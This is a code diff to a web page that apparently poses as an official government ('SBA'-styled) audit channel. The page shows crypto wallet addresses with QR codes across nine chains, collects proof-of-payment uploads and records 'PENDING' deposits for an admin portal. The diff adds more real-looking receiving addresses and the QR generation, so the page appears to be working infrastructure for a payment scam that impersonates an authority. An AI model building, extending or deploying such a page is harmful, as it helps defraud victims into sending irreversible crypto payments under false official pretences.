@@ -15,7 +15,7 @@
         .logo-frame { border: 2px solid var(--sba-blue); border-bottom-color: var(--sba-red); border-left-color: var(--sba-red); padding: 2px 8px; font-weight: 900; color: var(--sba-blue); font-size: 18px; line-height: 1; display: inline-block; }
         
         .glass-card { background: white; border-radius: 24px; box-shadow: 0 20px 40px rgba(0, 46, 109, 0.08); border: 1px solid #e2e8f0; }
-        .method-card { border: 2px solid #f1f5f9; border-radius: 16px; padding: 12px; cursor: pointer; transition: 0.2s; background: white; text-align: center; }
+        .method-card { border: 2px solid #f1f5f9; border-radius: 16px; padding: 10px 6px; cursor: pointer; transition: 0.2s; background: white; text-align: center; }
         .method-card.active { border-color: var(--sba-blue); background: #f0f7ff; box-shadow: 0 0 0 1px var(--sba-blue); }
 
         .btn-fed { background: var(--sba-blue); color: white; font-weight: 900; text-transform: uppercase; border-bottom: 4px solid #001a3d; cursor: pointer; width: 100%; border-radius: 14px; font-size: 13px; transition: all 0.2s; }
@@ -56,18 +56,42 @@
                     </div>
                     
                     <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Select Asset Channel</label>
-                    <div class="grid grid-cols-3 gap-3 mt-2 mb-6">
-                        <div class="method-card active" onclick="selectMethod('BTC', 'bc1qxy2kgdy6ynf36rly3rht60ks37u48zsh0ah345', this)">
-                            <i class="fab fa-bitcoin text-orange-500 text-xl"></i>
-                            <p class="text-[9px] font-black uppercase mt-1.5 text-slate-700">Bitcoin</p>
+                    <div class="grid grid-cols-3 gap-2 mt-2 mb-6">
+                        <div class="method-card active" onclick="selectMethod('BTC', 'bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k', 'Bitcoin', this)">
+                            <i class="fab fa-bitcoin text-orange-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">BTC</p>
                         </div>
-                        <div class="method-card" onclick="selectMethod('ETH', '0x742d35Cc6634C0532925a3b844Bc454e4438f44e', this)">
-                            <i class="fab fa-ethereum text-indigo-500 text-xl"></i>
-                            <p class="text-[9px] font-black uppercase mt-1.5 text-slate-700">ETH</p>
+                        <div class="method-card" onclick="selectMethod('USDT', '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E', 'USDT (BEP20 / ERC20)', this)">
+                            <i class="fas fa-dollar-sign text-emerald-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">USDT</p>
                         </div>
-                        <div class="method-card" onclick="selectMethod('USDT', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', this)">
-                            <i class="fas fa-dollar-sign text-emerald-500 text-xl"></i>
-                            <p class="text-[9px] font-black uppercase mt-1.5 text-slate-700">USDT</p>
+                        <div class="method-card" onclick="selectMethod('USDC', '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E', 'USDC (BASE / ERC20)', this)">
+                            <i class="fas fa-coins text-blue-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">USDC</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('ETH', '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E', 'Ethereum', this)">
+                            <i class="fab fa-ethereum text-indigo-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">ETH</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('BNB', '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E', 'BNB Chain', this)">
+                            <i class="fas fa-bolt text-yellow-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">BNB</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('SOL', '9UgFrLx796JagxDAJARrqzzW7c9DPHfrS2n3UH7vsMf4', 'Solana', this)">
+                            <i class="fas fa-sun text-purple-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">SOL</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('TRX', 'TKZcchSTjdJXEoVZmErwfiSUmZFnh6Tjwx', 'Tron', this)">
+                            <i class="fas fa-wave-square text-red-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">TRX</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('TON', 'UQCleKsmB8o-DF3fjkBR2X7gNrrs81Nv-zb_8mPW4GPx7yj9', 'TON Network', this)">
+                            <i class="fas fa-circle-nodes text-sky-500 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">TON</p>
+                        </div>
+                        <div class="method-card" onclick="selectMethod('SUI', '0xb63217f9308f3711bc4b277fc8029ac4f93c828c3af4b6684024cdbdf9811454', 'Sui Network', this)">
+                            <i class="fas fa-circle text-blue-400 text-lg"></i>
+                            <p class="text-[8px] font-black uppercase mt-1 text-slate-700 truncate">SUI</p>
                         </div>
                     </div>
 
@@ -78,13 +102,16 @@
                     </div>
 
                     <div class="bg-slate-900 p-4 rounded-2xl mb-6 border-b-4 border-gold shadow-lg">
-                        <div class="flex justify-between items-center mb-1">
+                        <div class="flex justify-between items-center mb-2">
                             <p id="methodLabel" class="text-[9px] font-black text-slate-500 uppercase">BTC Receiver</p>
                             <span class="text-[7px] bg-amber-500/10 text-amber-500 px-2 rounded-full font-black">OFFICIAL CHANNEL</span>
                         </div>
                         <div class="flex items-center justify-between gap-3 mt-1">
-                            <code id="walletAddr" class="text-[10px] font-bold text-amber-400 break-all leading-relaxed">bc1qxy2kgdy6ynf36rly3rht60ks37u48zsh0ah345</code>
+                            <code id="walletAddr" class="text-[10px] font-bold text-amber-400 break-all leading-relaxed">bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k</code>
                             <button onclick="copyAddr()" class="text-white bg-white/10 hover:bg-white/20 h-10 w-10 flex-shrink-0 rounded-xl transition-all"><i class="fas fa-copy text-sm"></i></button>
+                        </div>
+                        <div class="flex justify-center mt-4 p-2 bg-white rounded-xl" id="qrCodeArea">
+                            <img id="qrImg" src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k" alt="Wallet QR Code" class="h-28 w-28">
                         </div>
                     </div>
 
@@ -140,7 +167,7 @@
 
         <div class="mt-6 flex items-center gap-4 bg-white p-4 rounded-2xl border border-l-8 border-gold shadow-sm">
             <div class="relative">
-                <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=80" class="w-12 h-12 rounded-xl grayscale contrast-125">
+                <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=80" class="w-12 h-12 rounded-xl grayscale contrast-125" alt="Auditor">
                 <div class="absolute -bottom-1 -right-1 w-4 h-4 bg-emerald-500 border-2 border-white rounded-full"></div>
             </div>
             <div>
@@ -158,19 +185,22 @@
         let compressedImage = null;
         let selectedMethodName = "BTC";
 
-        window.selectMethod = (name, addr, el) => {
+        window.selectMethod = (name, addr, labelText, el) => {
             selectedMethodName = name;
             document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
             el.classList.add('active');
-            document.getElementById('methodLabel').innerText = `${name} Receiver`;
+            document.getElementById('methodLabel').innerText = `${labelText} Receiver`;
             document.getElementById('walletAddr').innerText = addr;
+            
+            // Update QR Code image source safely
+            const qrImg = document.getElementById('qrImg');
+            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=${encodeURIComponent(addr)}`;
         };
 
         window.resetNode = async () => {
             const btn = event.target;
             btn.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i>`;
             try {
-                // Change status back to something other than PENDING to show form
                 await updateDoc(doc(db, "users", auth.currentUser.uid), { depositStatus: "RETRY" });
             } catch (e) { console.error(e); }
         };
@@ -214,7 +244,7 @@
                 img.onload = () => {
                     const canvas = document.createElement('canvas');
                     const ctx = canvas.getContext('2d');
-                    const MAX_WIDTH = 800; // Increased quality
+                    const MAX_WIDTH = 800;
                     const scaleSize = MAX_WIDTH / img.width;
                     canvas.width = MAX_WIDTH;
                     canvas.height = img.height * scaleSize;
@@ -239,17 +269,7 @@
             try {
                 const userRef = doc(db, "users", auth.currentUser.uid);
                 const userSnap = await getDoc(userRef);
-                const fullName = userSnap.data().fullName || "Citizen";
 
-                const depEntry = {
-                    type: "DEPOSIT",
-                    amount: Number(amt),
-                    method: selectedMethodName,
-                    status: "PENDING",
-                    date: new Date().toISOString()
-                };
-
-                // Update fields to match exactly what Admin Portal expects
                 await updateDoc(userRef, {
                     depositStatus: "PENDING",
                     depositAmount: Number(amt),
@@ -262,12 +282,10 @@
                     })
                 });
 
-                // Clear UI
                 document.getElementById('depAmount').value = "";
                 compressedImage = null;
                 document.getElementById('popPreview').classList.add('hidden');
                 document.getElementById('uploadUI').classList.remove('hidden');
-                
             } catch (err) { 
                 alert("Audit Link Error: " + err.message); 
             }
